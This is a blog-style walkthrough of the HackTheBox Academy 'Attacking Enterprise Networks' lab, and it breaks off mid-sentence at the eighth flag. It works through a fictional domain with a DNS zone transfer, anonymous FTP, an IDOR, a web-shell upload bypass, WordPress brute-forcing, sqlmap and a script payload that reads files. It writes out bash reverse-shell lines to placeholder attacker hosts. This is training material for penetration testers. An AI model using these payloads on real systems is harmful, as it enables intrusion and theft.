---
title: HTBAcademy Attacking Enterprise Networks Walkthrough
date: 2025-03-14 00:00:01 +0800
categories: [HackTheBox]
tags: [HackTheBox]
---
Attacking Enterprise Networks is the final module for the HackTheBox Certified Penetration Tester Specialist career pathway. It attempts to combine all of the concepts that the student has learned from all of the previous modules and also best emulates the 10-day penetration test examination the student is expected to take after completing said modules. Other security professionals have said that the best way to take this module is to attempt it blind as a black-box penetration test, not reading any of the questions for hints and only working off of the given domain name and ip address to find all of the flags in the simulated Active Directory domain. 

Credit to Yerald Leiva on YouTube for his voiceless walkthrough which helped me navigate this box. This is the first full-scale blackbox engagement that I attempted blind, but whenever I got stuck his videos helped me on further tuning my methodology. 

## First Flag

The first flag was found using the following command:

```sh
dig axfr inlanefreight.local @10.129.229.147
```

### Output:
```
; <<>> DiG 9.18.30-0ubuntu0.24.04.2-Ubuntu <<>> axfr inlanefreight.local @10.129.229.147
;; global options: +cmd
inlanefreight.local. 86400 IN SOA ns1.inlanfreight.local. dnsadmin.inlanfreight.local. 21 604800 86400 2419200 86400
inlanefreight.local. 86400 IN NS inlanefreight.local.
inlanefreight.local. 86400 IN A 127.0.0.1
blog.inlanefreight.local. 86400 IN A 127.0.0.1
careers.inlanefreight.local. 86400 IN A 127.0.0.1
dev.inlanefreight.local. 86400 IN A 127.0.0.1
flag.inlanefreight.local. 86400 IN TXT "HTB{DNs_ZOn3_Tr@nsf3r}"
gitlab.inlanefreight.local. 86400 IN A 127.0.0.1
ir.inlanefreight.local. 86400 IN A 127.0.0.1
status.inlanefreight.local. 86400 IN A 127.0.0.1
support.inlanefreight.local. 86400 IN A 127.0.0.1
tracking.inlanefreight.local. 86400 IN A 127.0.0.1
vpn.inlanefreight.local. 86400 IN A 127.0.0.1
```

---

(note that the target ip address can change because the target machine will shut down after a period of time on HackTheBox and will need to be manually restarted, randomly changing the ip address)
## Second Flag

Found using an FTP anonymous login:

```sh
ftp anonymous@ip
get flag.txt
```

---

## Parameter Fuzzing

I fuzzed for parameters with ffuf, I got this as result from the following command:
```
ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://careers.inlanefreight.local:80/FUZZ?id=1 -fs (common size)
```


### Results:
```
apply        [Status: 200, Size: 16408, Words: 5625, Lines: 265, Duration: 84ms]
login        [Status: 200, Size: 9459, Words: 2752, Lines: 187, Duration: 159ms]
profile      [Status: 200, Size: 10148, Words: 3146, Lines: 195, Duration: 159ms]
register     [Status: 200, Size: 9754, Words: 2772, Lines: 191, Duration: 182ms]
```

### Third Flag
Then I browsed all the parameters and eventually got to http://careers.inlanefreight.local:80/register?id=1 to register an account with arbitrary credentials which authenticated me to the web server. I then was able view other profiles on http://careers.inlanefreight.local:80/profile?id=4 by adjusting the id parameter
which got me the third flag: HTB{8f40ecf17f681612246fa5728c159e46}

Next, I moved on to dev.inlanefreight.local. I used ffuf to enumerate any php files which got me to dev.inlanefreight.local/login.php. I noticed that I did not have access via the HTTP GET request, so I tried different HTTP requests until I noticed that the TRACK request worked (TRACE request did not work either), and then noticed from the original get request that there was an HTTP line called X-Custom-IP-Authorization, which declared a 172 ip address. I set it to loopback address to try to delcare myself as an authorized ip address, which successfully got me onto the login.php website. 

### Fourth Flag
Then, I see a file upload button and tried uploading a PHP web shell. It did not work since the uploader only allowed img/png files. I uploaded a test png file and recorded the HTTP POST request on BurpSuite. I changed the JPG code to the php web shell code, and then sent it again on BurpSuite to the site. This is successful and gave me a response saying that file was uploaded to /uploads/screenshot.png:
![[Pasted image 20250314195405.png]]

I tried to execute commands with the png file through executing the command on the url: http://dev.inlanefreight.local/uploads/screenshot.png?cmd=id , however it does not work since screenshot.png is a png file so it will not execute as a php file. I then changed the file extension on BurpSuite to screenshot.php and then uploaded the file using the POST request above. This works, and I was able to get remote code execution with http://dev.inlanefreight.local/uploads/screenshot.php?cmd=id

Then I checked the entire directory for a flag.txt using a find command, but since this is a web shell, I will have to url encode the command:
find / -type f -name "*flag.txt*" 2>/dev/null becomes find%20%2F%20-type%20f%20-name%20%22%2Aflag.txt%2A%22%202%3E%2Fdev%2Fnull.

After typing the command on the web browser as 

http://dev.inlanefreight.local/uploads/screenshot.php?cmd=find%20%2F%20-type%20f%20-name%20%22%2Aflag.txt%2A%22%202%3E%2Fdev%2Fnull,

I get a flag.txt file at the directory /var/www/html/flag.txt. 

Using another url encoded command cat%20%2Fvar%2Fwww%2Fhtml%2Fflag.txt,

we get HTB{57c7f6d939eeda90aa1488b15617b9fa} as the 4th flag.

### Fifth Flag:

Since we now have remote code execution through the web shell, we will attempt to upgrade the web shell to a fully interactive shell. 

I tried a variety of reverse shell one liners to connect to my local netcat listener and got this bash one liner shell to work: bash -c 'bash -i >& /dev/tcp/YOUR_IP/1234 0>&1'

I URL-encoded the bash one liner and entered it on the url with my netcat listener active and got a working bash shell. I tried to escalate the shell to a fully interactive shell but was unsuccessful so I went ahead and looked at the other subdomains.

I went to ir.inlanefreight.local and I see that it is a wordpress site. I installed wpscan from the github repository and ran it against the url with 
wpscan --url http://ir.inlanefreight.local -e u --no-banner --api-token (api token from wpscan.com)

Got an interesting user called ilfreightwp from the above scan. I ran a bruteforce password attack using wpscan with 
wpscan --url http://ir.inlanefreight.local -P SecLists/Passwords/darkweb2017-top100.txt -U ilfreightwp --no-banner -t 500

and I got the password password1 for the user ilfreightwp. 

Logging into WordPress, we try the theme editor attack where we inject a php reverse shell one liner using bash with <?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
?>

and then inserting it into one of the themes php files. We then start our netcat listener and activate the theme to receive the bash shell. After using a find command, we find the 5th flag in the /var/www/html directory: HTB{e7134abea7438e937b87608eab0d979c}

### Sixth Flag:

Next we move onto status.inlanefreight.local. I see that there is a text box on the website so I attempted a sql injection with ' OR 1=1 --. It did not seem to work but it did throw a SQL error message on BurpSuite repeater. I saved the HTTP request as a file and then input it into sqlmap with the command "sqlmap -r sqlmap1 --batch --dump --level 5 --risk 3" with sqlmap1 as the HTTP request file. 

The command gives us this table:
```
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
+----+-----------------------------------+----------+
```

and we get the ==6th flag: 1fbea4df249ac4f4881a5da387eb297cf==

### Seventh Flag:
For tracking.inlanefreight.local, we try to list out potential filesystems with a javascript command using XMLHttpRequest():
```
<script>
    var files = ["/etc/", "C:/Windows/", "C:/Users/", "/home/", "/var/www/"];
    files.forEach(function(path) {
        var x = new XMLHttpRequest();
        x.onload = function() { document.write(path + " exists<br>"); };
        x.onerror = function() { document.write(path + " not accessible<br>"); };
        x.open("GET", "file:///" + path, true);
        x.send();
    });
</script>
```

When we paste this command into the text prompt, we get the output "/etc/ not accessible". Since we see that XMLHttpRequest gets us a response, we can create a request that tries to read a flag.txt from the filesystem if it exists:

```
<script>
    x = new XMLHttpRequest;
    x.onload = function() { document.write(this.responseText); };
    x.open("GET", "file:///flag.txt");
    x.send();
</script>
```

This works, and gets us our ==7th flag from tracking.inlanefreight.local: HTB{49f0bad299687c62334182178bfd75d8}==

### 8th Flag:

Next target will be gitlab.inlanefreight.local.

We see that it brings us to a gitlab page where it prompts us to login/register. We can register a test account and login. We don't see anything interesting at first, but with some browsing we see that if we go to Menu -> Groups -> Explore Groups, we come across a GitLab instance with the ==8th flag: HTB{32596e8376077c3ef8d5cf52f15279ba}==

We also have access to a website repository called shopdev2.inlanefreight.local. When visiting "my cart," we notice that 
